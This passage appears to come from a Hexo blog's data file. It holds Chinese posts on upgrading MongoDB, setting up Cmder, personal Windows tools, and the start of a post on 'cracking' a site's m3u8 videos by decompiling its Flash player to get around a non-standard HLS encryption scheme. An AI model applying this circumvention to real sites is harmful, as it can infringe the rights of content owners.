升级到 3.6 再升级到 4.0。具体的脚本内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install mongodb@3.4</span><br><span class=\"line\">brew services start mongodb@3.4</span><br><span class=\"line\">/usr/local/opt/mongodb@3.4/bin/mongo</span><br><span class=\"line\">&gt; db.adminCommand( &#123; setFeatureCompatibilityVersion: &quot;3.4&quot; &#125; )</span><br><span class=\"line\">brew uninstall mongodb@3.4</span><br><span class=\"line\"></span><br><span class=\"line\">// 安装 MongoDB 3.6</span><br><span class=\"line\">brew services start mongodb@3.6</span><br><span class=\"line\">/usr/local/opt/mongodb@3.6/bin/mongo</span><br><span class=\"line\">&gt; db.adminCommand( &#123; setFeatureCompatibilityVersion: &quot;3.6&quot; &#125; )</span><br><span class=\"line\">brew services stop mongodb@3.6</span><br><span class=\"line\">brew uninstall mongodb@3.6</span><br><span class=\"line\"></span><br><span class=\"line\">// 安装 MongoDB 4</span><br><span class=\"line\">brew install mongodb</span><br><span class=\"line\">brew services start mongodb</span><br></pre></td></tr></table></figure>\n\n<p>升级完毕后，发现存储引擎仍然为 MMAPV1，需要升级为 wiredTiger，因此我在导出数据库后，删除数据库文件夹后又重装了 MongoDB 再导入数据，数据库占用空间也瞬时缩减了一大半。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mongodump --out mongodb</span><br><span class=\"line\">brew uninstall mongodb</span><br><span class=\"line\">rm -rf /usr/local/var/mongodb</span><br><span class=\"line\">brew install mongodb</span><br><span class=\"line\">brew services start mongodb</span><br><span class=\"line\">mongorestore mongodb</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h2><p><a href=\"https://www.jianshu.com/p/7231b509c279\">为什么你的 Git 仓库变得如此臃肿</a><br><a href=\"https://stackoverflow.com/questions/29930198/can-i-delete-data-from-ios-devicesupport/29931912\">Can I delete data from iOS DeviceSupport?</a></p>\n"},{"title":"Cmder","date":"2015-03-21T15:34:12.000Z","_content":"\n## Cmder简介\n\nCmder是一款Windows下面的终端模拟器，有了它终于能够抛弃默认的垃圾cmd界面了！\n\n![Cmder](/img/cmder.png)\n\n### 特点\n\n个人很简单的使用了下，觉得有以下优点：\n\n1. 可自定义字体，配色非常好看。\n\n2. 路径补全有所提高。\n\n## 使用配置\n\n### 乱码\n\nls的乱码主要是参数问题，修改文件cmder/config/aliases：\n\n```\nl=ls --show-control-chars\nla=ls -aF --show-control-chars\nll=ls -alF --show-control-chars\nls=ls --show-control-chars -F\n```\n\n### 中文重叠\n\n在设置中，取消`Main console font`下的Monospace勾，这样中文字符（占用两个英文字符空间）就得到的了足够的空间了。\n\n### 右键打开Cmder\n\n以管理员权限运行，输入命令`.\\cmder.exe /REGISTER ALL`，在任意目录下右击就会出现`Cmder Here`，可以打开并默认切换到该目录。\n\n### 退格后错位\n\n> [lgh](https://www.v2ex.com/member/lgh):\n> cmder 功能强大，但是反应较慢，经常卡住半天才反应；默认的命令提示符 λ 还会导致在用 TAB 还是 BACKSPACE 之后字符错位（自己改配置换成 $ 后就不会）。\n> 现在干脆直接用 ConEmu 了。\n> 来源：https://www.v2ex.com/t/155058\n\nlgh针对问题1提出解决方法是修改提示符为$。修改方法是\n\n打开文件config/prompt.lua，将第二行中的λ修改为Linux下常用的$\n\n## 不足\n\n当然，可能这些问题只是因为我没有找到对应的解决方法。\n\n1. <del>有时候会出现无法删除第一个字符的情况（实际已经删除了）。</del>\n\n2. 路径补全还是没有达到zsh的效果。\n\n3. 没有快速进入某个目录的功能。\n\n4. Cmder1.2开始需要VS**2015**运行库支持（丧心病狂！）\n\n## 最后\n\n现在只是刚开始使用，很多功能还是在摸索中，如果有更多的体会，会继续更新。\n","source":"_posts/Cmder.md","raw":"title: \"Cmder\"\ndate: 2015-03-21 15:34:12\ntags: \"Windows\"\n---\n\n## Cmder简介\n\nCmder是一款Windows下面的终端模拟器，有了它终于能够抛弃默认的垃圾cmd界面了！\n\n![Cmder](/img/cmder.png)\n\n### 特点\n\n个人很简单的使用了下，觉得有以下优点：\n\n1. 可自定义字体，配色非常好看。\n\n2. 路径补全有所提高。\n\n## 使用配置\n\n### 乱码\n\nls的乱码主要是参数问题，修改文件cmder/config/aliases：\n\n```\nl=ls --show-control-chars\nla=ls -aF --show-control-chars\nll=ls -alF --show-control-chars\nls=ls --show-control-chars -F\n```\n\n### 中文重叠\n\n在设置中，取消`Main console font`下的Monospace勾，这样中文字符（占用两个英文字符空间）就得到的了足够的空间了。\n\n### 右键打开Cmder\n\n以管理员权限运行，输入命令`.\\cmder.exe /REGISTER ALL`，在任意目录下右击就会出现`Cmder Here`，可以打开并默认切换到该目录。\n\n### 退格后错位\n\n> [lgh](https://www.v2ex.com/member/lgh):\n> cmder 功能强大，但是反应较慢，经常卡住半天才反应；默认的命令提示符 λ 还会导致在用 TAB 还是 BACKSPACE 之后字符错位（自己改配置换成 $ 后就不会）。\n> 现在干脆直接用 ConEmu 了。\n> 来源：https://www.v2ex.com/t/155058\n\nlgh针对问题1提出解决方法是修改提示符为$。修改方法是\n\n打开文件config/prompt.lua，将第二行中的λ修改为Linux下常用的$\n\n## 不足\n\n当然，可能这些问题只是因为我没有找到对应的解决方法。\n\n1. <del>有时候会出现无法删除第一个字符的情况（实际已经删除了）。</del>\n\n2. 路径补全还是没有达到zsh的效果。\n\n3. 没有快速进入某个目录的功能。\n\n4. Cmder1.2开始需要VS**2015**运行库支持（丧心病狂！）\n\n## 最后\n\n现在只是刚开始使用，很多功能还是在摸索中，如果有更多的体会，会继续更新。\n","slug":"Cmder","published":1,"updated":"2020-09-07T02:31:06.564Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmh0005xrn53g1t31aj","content":"<h2 id=\"Cmder简介\"><a href=\"#Cmder简介\" class=\"headerlink\" title=\"Cmder简介\"></a>Cmder简介</h2><p>Cmder是一款Windows下面的终端模拟器，有了它终于能够抛弃默认的垃圾cmd界面了！</p>\n<p><img src=\"/img/cmder.png\" alt=\"Cmder\"></p>\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><p>个人很简单的使用了下，觉得有以下优点：</p>\n<ol>\n<li><p>可自定义字体，配色非常好看。</p>\n</li>\n<li><p>路径补全有所提高。</p>\n</li>\n</ol>\n<h2 id=\"使用配置\"><a href=\"#使用配置\" class=\"headerlink\" title=\"使用配置\"></a>使用配置</h2><h3 id=\"乱码\"><a href=\"#乱码\" class=\"headerlink\" title=\"乱码\"></a>乱码</h3><p>ls的乱码主要是参数问题，修改文件cmder&#x2F;config&#x2F;aliases：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">l=ls --show-control-chars</span><br><span class=\"line\">la=ls -aF --show-control-chars</span><br><span class=\"line\">ll=ls -alF --show-control-chars</span><br><span class=\"line\">ls=ls --show-control-chars -F</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"中文重叠\"><a href=\"#中文重叠\" class=\"headerlink\" title=\"中文重叠\"></a>中文重叠</h3><p>在设置中，取消<code>Main console font</code>下的Monospace勾，这样中文字符（占用两个英文字符空间）就得到的了足够的空间了。</p>\n<h3 id=\"右键打开Cmder\"><a href=\"#右键打开Cmder\" class=\"headerlink\" title=\"右键打开Cmder\"></a>右键打开Cmder</h3><p>以管理员权限运行，输入命令<code>.\\cmder.exe /REGISTER ALL</code>，在任意目录下右击就会出现<code>Cmder Here</code>，可以打开并默认切换到该目录。</p>\n<h3 id=\"退格后错位\"><a href=\"#退格后错位\" class=\"headerlink\" title=\"退格后错位\"></a>退格后错位</h3><blockquote>\n<p><a href=\"https://www.v2ex.com/member/lgh\">lgh</a>:<br>cmder 功能强大，但是反应较慢，经常卡住半天才反应；默认的命令提示符 λ 还会导致在用 TAB 还是 BACKSPACE 之后字符错位（自己改配置换成 $ 后就不会）。<br>现在干脆直接用 ConEmu 了。<br>来源：<a href=\"https://www.v2ex.com/t/155058\">https://www.v2ex.com/t/155058</a></p>\n</blockquote>\n<p>lgh针对问题1提出解决方法是修改提示符为$。修改方法是</p>\n<p>打开文件config&#x2F;prompt.lua，将第二行中的λ修改为Linux下常用的$</p>\n<h2 id=\"不足\"><a href=\"#不足\" class=\"headerlink\" title=\"不足\"></a>不足</h2><p>当然，可能这些问题只是因为我没有找到对应的解决方法。</p>\n<ol>\n<li><p><del>有时候会出现无法删除第一个字符的情况（实际已经删除了）。</del></p>\n</li>\n<li><p>路径补全还是没有达到zsh的效果。</p>\n</li>\n<li><p>没有快速进入某个目录的功能。</p>\n</li>\n<li><p>Cmder1.2开始需要VS<strong>2015</strong>运行库支持（丧心病狂！）</p>\n</li>\n</ol>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>现在只是刚开始使用，很多功能还是在摸索中，如果有更多的体会，会继续更新。</p>\n","excerpt":"","more":"<h2 id=\"Cmder简介\"><a href=\"#Cmder简介\" class=\"headerlink\" title=\"Cmder简介\"></a>Cmder简介</h2><p>Cmder是一款Windows下面的终端模拟器，有了它终于能够抛弃默认的垃圾cmd界面了！</p>\n<p><img src=\"/img/cmder.png\" alt=\"Cmder\"></p>\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><p>个人很简单的使用了下，觉得有以下优点：</p>\n<ol>\n<li><p>可自定义字体，配色非常好看。</p>\n</li>\n<li><p>路径补全有所提高。</p>\n</li>\n</ol>\n<h2 id=\"使用配置\"><a href=\"#使用配置\" class=\"headerlink\" title=\"使用配置\"></a>使用配置</h2><h3 id=\"乱码\"><a href=\"#乱码\" class=\"headerlink\" title=\"乱码\"></a>乱码</h3><p>ls的乱码主要是参数问题，修改文件cmder&#x2F;config&#x2F;aliases：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">l=ls --show-control-chars</span><br><span class=\"line\">la=ls -aF --show-control-chars</span><br><span class=\"line\">ll=ls -alF --show-control-chars</span><br><span class=\"line\">ls=ls --show-control-chars -F</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"中文重叠\"><a href=\"#中文重叠\" class=\"headerlink\" title=\"中文重叠\"></a>中文重叠</h3><p>在设置中，取消<code>Main console font</code>下的Monospace勾，这样中文字符（占用两个英文字符空间）就得到的了足够的空间了。</p>\n<h3 id=\"右键打开Cmder\"><a href=\"#右键打开Cmder\" class=\"headerlink\" title=\"右键打开Cmder\"></a>右键打开Cmder</h3><p>以管理员权限运行，输入命令<code>.\\cmder.exe /REGISTER ALL</code>，在任意目录下右击就会出现<code>Cmder Here</code>，可以打开并默认切换到该目录。</p>\n<h3 id=\"退格后错位\"><a href=\"#退格后错位\" class=\"headerlink\" title=\"退格后错位\"></a>退格后错位</h3><blockquote>\n<p><a href=\"https://www.v2ex.com/member/lgh\">lgh</a>:<br>cmder 功能强大，但是反应较慢，经常卡住半天才反应；默认的命令提示符 λ 还会导致在用 TAB 还是 BACKSPACE 之后字符错位（自己改配置换成 $ 后就不会）。<br>现在干脆直接用 ConEmu 了。<br>来源：<a href=\"https://www.v2ex.com/t/155058\">https://www.v2ex.com/t/155058</a></p>\n</blockquote>\n<p>lgh针对问题1提出解决方法是修改提示符为$。修改方法是</p>\n<p>打开文件config&#x2F;prompt.lua，将第二行中的λ修改为Linux下常用的$</p>\n<h2 id=\"不足\"><a href=\"#不足\" class=\"headerlink\" title=\"不足\"></a>不足</h2><p>当然，可能这些问题只是因为我没有找到对应的解决方法。</p>\n<ol>\n<li><p><del>有时候会出现无法删除第一个字符的情况（实际已经删除了）。</del></p>\n</li>\n<li><p>路径补全还是没有达到zsh的效果。</p>\n</li>\n<li><p>没有快速进入某个目录的功能。</p>\n</li>\n<li><p>Cmder1.2开始需要VS<strong>2015</strong>运行库支持（丧心病狂！）</p>\n</li>\n</ol>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>现在只是刚开始使用，很多功能还是在摸索中，如果有更多的体会，会继续更新。</p>\n"},{"title":"个人通用设置","date":"2015-05-24T18:17:25.000Z","_content":"\n## 系统基础设置\n\n### 字体\n\n利用MacType渲染字体，一直比较喜欢使用系统默认的雅黑字体，有人对雅黑字体进行了修改，将其和Consolas结合优化。作者时RobertLee，原文链接是[雅黑-Consolas混合字体，2008年5月22日更新~](http://www.cnblogs.com/RobertLee/archive/2006/12/25/602646.html)，貌似很少有贴作者信息的。\n\n## 常用软件\n\n### Total Commander\n\n文件夹命名使用\"数字+中文拼音首字母+中文描述\"，Ctrl+Q快速预览文件\n\n### CCleaner\n\n### Altrun/ALMRun\n\n快速启动软件，前者好长时间没有更新了，可以使用后者替代\n\n### Everything\n\n不解释\n\n### KeyTweak\n\n用于将CapsLock键和右Ctrl键交换，将Ctrl键放到更加容易接触到的位置。\n\n## 编辑工具\n\n### Vim\n\n使用spf-13配置，比较方便，虽然同时也会有很多坑，需要自己慢慢修改。但是插件无法后台运行，因此速度比较慢。\n\n### Notepad++\n\n用于替代记事本的轻量级编辑器\n\n### Sublime Text\n\n有Vim模式，运行速度相对VIM快，但是编码比较头疼，在Windows下面我会用来替代Vim\n\n## 编程工具\n\n### Visual Studio 2013\n\n基本设置：选择深色主题，开启多处理器编译，开启行号\n\n常用插件：\n\n* Visual Assist X: 不解释\n\n注：Visual Assist X最新版无法直接搜索到VC6的安装路径，需要在注册表中`HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msdev.exe`指定实际路径。这有可能是绿色版导致的。\n\n参考http://tunps.com/newest-vax-support-on-vc-6\n\n* VsVim: 我是VIM党\n\n* Disable Mouse Wheel Zoom: 禁用滚轮缩放代码\n\n* TroutZoom: 固定代码缩放比率\n\n### Eclipse设置\n\n基本设置：开启行号\n\n常用插件：\n\n* Eclipse Color Theme: 配色很重要\n\n* viPlugin: 我是Vim党\n\n","source":"_posts/Common.md","raw":"title: \"个人通用设置\"\ndate: 2015-05-24 18:17:25\ntags: \"Windows\"\n---\n\n## 系统基础设置\n\n### 字体\n\n利用MacType渲染字体，一直比较喜欢使用系统默认的雅黑字体，有人对雅黑字体进行了修改，将其和Consolas结合优化。作者时RobertLee，原文链接是[雅黑-Consolas混合字体，2008年5月22日更新~](http://www.cnblogs.com/RobertLee/archive/2006/12/25/602646.html)，貌似很少有贴作者信息的。\n\n## 常用软件\n\n### Total Commander\n\n文件夹命名使用\"数字+中文拼音首字母+中文描述\"，Ctrl+Q快速预览文件\n\n### CCleaner\n\n### Altrun/ALMRun\n\n快速启动软件，前者好长时间没有更新了，可以使用后者替代\n\n### Everything\n\n不解释\n\n### KeyTweak\n\n用于将CapsLock键和右Ctrl键交换，将Ctrl键放到更加容易接触到的位置。\n\n## 编辑工具\n\n### Vim\n\n使用spf-13配置，比较方便，虽然同时也会有很多坑，需要自己慢慢修改。但是插件无法后台运行，因此速度比较慢。\n\n### Notepad++\n\n用于替代记事本的轻量级编辑器\n\n### Sublime Text\n\n有Vim模式，运行速度相对VIM快，但是编码比较头疼，在Windows下面我会用来替代Vim\n\n## 编程工具\n\n### Visual Studio 2013\n\n基本设置：选择深色主题，开启多处理器编译，开启行号\n\n常用插件：\n\n* Visual Assist X: 不解释\n\n注：Visual Assist X最新版无法直接搜索到VC6的安装路径，需要在注册表中`HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msdev.exe`指定实际路径。这有可能是绿色版导致的。\n\n参考http://tunps.com/newest-vax-support-on-vc-6\n\n* VsVim: 我是VIM党\n\n* Disable Mouse Wheel Zoom: 禁用滚轮缩放代码\n\n* TroutZoom: 固定代码缩放比率\n\n### Eclipse设置\n\n基本设置：开启行号\n\n常用插件：\n\n* Eclipse Color Theme: 配色很重要\n\n* viPlugin: 我是Vim党\n\n","slug":"Common","published":1,"updated":"2020-09-07T02:31:06.564Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmi0006xrn52dvtf684","content":"<h2 id=\"系统基础设置\"><a href=\"#系统基础设置\" class=\"headerlink\" title=\"系统基础设置\"></a>系统基础设置</h2><h3 id=\"字体\"><a href=\"#字体\" class=\"headerlink\" title=\"字体\"></a>字体</h3><p>利用MacType渲染字体，一直比较喜欢使用系统默认的雅黑字体，有人对雅黑字体进行了修改，将其和Consolas结合优化。作者时RobertLee，原文链接是<a href=\"http://www.cnblogs.com/RobertLee/archive/2006/12/25/602646.html\">雅黑-Consolas混合字体，2008年5月22日更新~</a>，貌似很少有贴作者信息的。</p>\n<h2 id=\"常用软件\"><a href=\"#常用软件\" class=\"headerlink\" title=\"常用软件\"></a>常用软件</h2><h3 id=\"Total-Commander\"><a href=\"#Total-Commander\" class=\"headerlink\" title=\"Total Commander\"></a>Total Commander</h3><p>文件夹命名使用”数字+中文拼音首字母+中文描述”，Ctrl+Q快速预览文件</p>\n<h3 id=\"CCleaner\"><a href=\"#CCleaner\" class=\"headerlink\" title=\"CCleaner\"></a>CCleaner</h3><h3 id=\"Altrun-ALMRun\"><a href=\"#Altrun-ALMRun\" class=\"headerlink\" title=\"Altrun&#x2F;ALMRun\"></a>Altrun&#x2F;ALMRun</h3><p>快速启动软件，前者好长时间没有更新了，可以使用后者替代</p>\n<h3 id=\"Everything\"><a href=\"#Everything\" class=\"headerlink\" title=\"Everything\"></a>Everything</h3><p>不解释</p>\n<h3 id=\"KeyTweak\"><a href=\"#KeyTweak\" class=\"headerlink\" title=\"KeyTweak\"></a>KeyTweak</h3><p>用于将CapsLock键和右Ctrl键交换，将Ctrl键放到更加容易接触到的位置。</p>\n<h2 id=\"编辑工具\"><a href=\"#编辑工具\" class=\"headerlink\" title=\"编辑工具\"></a>编辑工具</h2><h3 id=\"Vim\"><a href=\"#Vim\" class=\"headerlink\" title=\"Vim\"></a>Vim</h3><p>使用spf-13配置，比较方便，虽然同时也会有很多坑，需要自己慢慢修改。但是插件无法后台运行，因此速度比较慢。</p>\n<h3 id=\"Notepad\"><a href=\"#Notepad\" class=\"headerlink\" title=\"Notepad++\"></a>Notepad++</h3><p>用于替代记事本的轻量级编辑器</p>\n<h3 id=\"Sublime-Text\"><a href=\"#Sublime-Text\" class=\"headerlink\" title=\"Sublime Text\"></a>Sublime Text</h3><p>有Vim模式，运行速度相对VIM快，但是编码比较头疼，在Windows下面我会用来替代Vim</p>\n<h2 id=\"编程工具\"><a href=\"#编程工具\" class=\"headerlink\" title=\"编程工具\"></a>编程工具</h2><h3 id=\"Visual-Studio-2013\"><a href=\"#Visual-Studio-2013\" class=\"headerlink\" title=\"Visual Studio 2013\"></a>Visual Studio 2013</h3><p>基本设置：选择深色主题，开启多处理器编译，开启行号</p>\n<p>常用插件：</p>\n<ul>\n<li>Visual Assist X: 不解释</li>\n</ul>\n<p>注：Visual Assist X最新版无法直接搜索到VC6的安装路径，需要在注册表中<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msdev.exe</code>指定实际路径。这有可能是绿色版导致的。</p>\n<p>参考<a href=\"http://tunps.com/newest-vax-support-on-vc-6\">http://tunps.com/newest-vax-support-on-vc-6</a></p>\n<ul>\n<li><p>VsVim: 我是VIM党</p>\n</li>\n<li><p>Disable Mouse Wheel Zoom: 禁用滚轮缩放代码</p>\n</li>\n<li><p>TroutZoom: 固定代码缩放比率</p>\n</li>\n</ul>\n<h3 id=\"Eclipse设置\"><a href=\"#Eclipse设置\" class=\"headerlink\" title=\"Eclipse设置\"></a>Eclipse设置</h3><p>基本设置：开启行号</p>\n<p>常用插件：</p>\n<ul>\n<li><p>Eclipse Color Theme: 配色很重要</p>\n</li>\n<li><p>viPlugin: 我是Vim党</p>\n</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"系统基础设置\"><a href=\"#系统基础设置\" class=\"headerlink\" title=\"系统基础设置\"></a>系统基础设置</h2><h3 id=\"字体\"><a href=\"#字体\" class=\"headerlink\" title=\"字体\"></a>字体</h3><p>利用MacType渲染字体，一直比较喜欢使用系统默认的雅黑字体，有人对雅黑字体进行了修改，将其和Consolas结合优化。作者时RobertLee，原文链接是<a href=\"http://www.cnblogs.com/RobertLee/archive/2006/12/25/602646.html\">雅黑-Consolas混合字体，2008年5月22日更新~</a>，貌似很少有贴作者信息的。</p>\n<h2 id=\"常用软件\"><a href=\"#常用软件\" class=\"headerlink\" title=\"常用软件\"></a>常用软件</h2><h3 id=\"Total-Commander\"><a href=\"#Total-Commander\" class=\"headerlink\" title=\"Total Commander\"></a>Total Commander</h3><p>文件夹命名使用”数字+中文拼音首字母+中文描述”，Ctrl+Q快速预览文件</p>\n<h3 id=\"CCleaner\"><a href=\"#CCleaner\" class=\"headerlink\" title=\"CCleaner\"></a>CCleaner</h3><h3 id=\"Altrun-ALMRun\"><a href=\"#Altrun-ALMRun\" class=\"headerlink\" title=\"Altrun&#x2F;ALMRun\"></a>Altrun&#x2F;ALMRun</h3><p>快速启动软件，前者好长时间没有更新了，可以使用后者替代</p>\n<h3 id=\"Everything\"><a href=\"#Everything\" class=\"headerlink\" title=\"Everything\"></a>Everything</h3><p>不解释</p>\n<h3 id=\"KeyTweak\"><a href=\"#KeyTweak\" class=\"headerlink\" title=\"KeyTweak\"></a>KeyTweak</h3><p>用于将CapsLock键和右Ctrl键交换，将Ctrl键放到更加容易接触到的位置。</p>\n<h2 id=\"编辑工具\"><a href=\"#编辑工具\" class=\"headerlink\" title=\"编辑工具\"></a>编辑工具</h2><h3 id=\"Vim\"><a href=\"#Vim\" class=\"headerlink\" title=\"Vim\"></a>Vim</h3><p>使用spf-13配置，比较方便，虽然同时也会有很多坑，需要自己慢慢修改。但是插件无法后台运行，因此速度比较慢。</p>\n<h3 id=\"Notepad\"><a href=\"#Notepad\" class=\"headerlink\" title=\"Notepad++\"></a>Notepad++</h3><p>用于替代记事本的轻量级编辑器</p>\n<h3 id=\"Sublime-Text\"><a href=\"#Sublime-Text\" class=\"headerlink\" title=\"Sublime Text\"></a>Sublime Text</h3><p>有Vim模式，运行速度相对VIM快，但是编码比较头疼，在Windows下面我会用来替代Vim</p>\n<h2 id=\"编程工具\"><a href=\"#编程工具\" class=\"headerlink\" title=\"编程工具\"></a>编程工具</h2><h3 id=\"Visual-Studio-2013\"><a href=\"#Visual-Studio-2013\" class=\"headerlink\" title=\"Visual Studio 2013\"></a>Visual Studio 2013</h3><p>基本设置：选择深色主题，开启多处理器编译，开启行号</p>\n<p>常用插件：</p>\n<ul>\n<li>Visual Assist X: 不解释</li>\n</ul>\n<p>注：Visual Assist X最新版无法直接搜索到VC6的安装路径，需要在注册表中<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msdev.exe</code>指定实际路径。这有可能是绿色版导致的。</p>\n<p>参考<a href=\"http://tunps.com/newest-vax-support-on-vc-6\">http://tunps.com/newest-vax-support-on-vc-6</a></p>\n<ul>\n<li><p>VsVim: 我是VIM党</p>\n</li>\n<li><p>Disable Mouse Wheel Zoom: 禁用滚轮缩放代码</p>\n</li>\n<li><p>TroutZoom: 固定代码缩放比率</p>\n</li>\n</ul>\n<h3 id=\"Eclipse设置\"><a href=\"#Eclipse设置\" class=\"headerlink\" title=\"Eclipse设置\"></a>Eclipse设置</h3><p>基本设置：开启行号</p>\n<p>常用插件：</p>\n<ul>\n<li><p>Eclipse Color Theme: 配色很重要</p>\n</li>\n<li><p>viPlugin: 我是Vim党</p>\n</li>\n</ul>\n"},{"title":"破解某网站m3u8视频资源","date":"2017-10-02T10:37:29.000Z","_content":"\n---\n\n# 破解某网站m3u8视频资源\n\n## 背景\n\n某个视频教学网站资源即将超过有效期，因此尝试将网页上的视频下载到本地。\n\n## 过程\n\n### 1. 登录验证\n\n这部分非常简单，模拟提交登录表单，并及时保存对应的Cookie即可\n\n### 2. 视频播放流程\n\n这个网页上使用了一个Flash播放器，然后通过该Flash文件读取m3u8文件进行播放。\n\nHTTP Live Streaming（HLS）是苹果公司(Apple Inc.)实现的基于HTTP的流媒体传输协议，m3u8，是HTTP Live Streaming直播的索引文件。该文件包含了这个视频的一系列视频分片，Flash播放器或者\n\n\n```\n    #EXTM3U\n    #EXT-X-VERSION:3\n    #EXT-X-MEDIA-SEQUENCE:0\n    #EXT-X-ALLOW-CACHE:YES\n    #EXT-X-TARGETDURATION:11\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0xe532855feb3e18366b8e7ea0c11f3116\n    #EXTINF:10.066667,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg0\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0x48586a2ac8397fbce9565480259c1b94\n    #EXTINF:10.000000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg1\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0x928f18982f6ee1a7e36cfa8f36979c3a\n    #EXTINF:10.000000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg2\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0x6651941d56de8af0c7d4bee9ae33a8de\n    #EXTINF:10.000000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg3\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0x90df003d61ba2ef9413fdaf521cfce15\n    #EXTINF:10.000000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg4\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0xc7773183806b8d3d7e44811076ed5b66\n    #EXTINF:2.200000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg5\n    #EXT-X-ENDLIST\n```\n\nm3u8内容如上所示，解析时一般是根据`EXT-X-KEY`中的`METHOD`的加密方法和`URI`链接下载密钥内容，最终结合`IV`解密后续的分片url。\n\n### 3. 变种\n\n上述是正常的播放过程，但是对该网站解析时却失败了，解密出来的结果却不是正常的视频，多次尝试后，唯一的剩下的可能性便是这个Flash播放器采用了变种HLS协议。\n\n使用[ffdec](https://www.free-decompiler.com/flash/download/)打开下载得到的Flash播放文件，阅读其中的代码，果然并非标准的HLS协议。\n","source":"_posts/Crack-M3U8.md","raw":"\ntitle:  破解某网站m3u8视频资源\ndate: 2017-10-02 10:37:29\ntags: [\"Flash\", \"Web\"]\n---\n\n---\n\n# 破解某网站m3u8视频资源\n\n## 背景\n\n某个视频教学网站资源即将超过有效期，因此尝试将网页上的视频下载到本地。\n\n## 过程\n\n### 1. 登录验证\n\n这部分非常简单，模拟提交登录表单，并及时保存对应的Cookie即可\n\n### 2. 视频播放流程\n\n这个网页上使用了一个Flash播放器，然后通过该Flash文件读取m3u8文件进行播放。\n\nHTTP Live Streaming（HLS）是苹果公司(Apple Inc.)实现的基于HTTP的流媒体传输协议，m3u8，是HTTP Live Streaming直播的索引文件。该文件包含了这个视频的一系列视频分片，Flash播放器或者\n\n\n```\n    #EXTM3U\n    #EXT-X-VERSION:3\n    #EXT-X-MEDIA-SEQUENCE:0\n    #EXT-X-ALLOW-CACHE:YES\n    #EXT-X-TARGETDURATION:11\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0xe532855feb3e18366b8e7ea0c11f3116\n    #EXTINF:10.066667,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg0\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0x48586a2ac8397fbce9565480259c1b94\n    #EXTINF:10.000000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg1\n    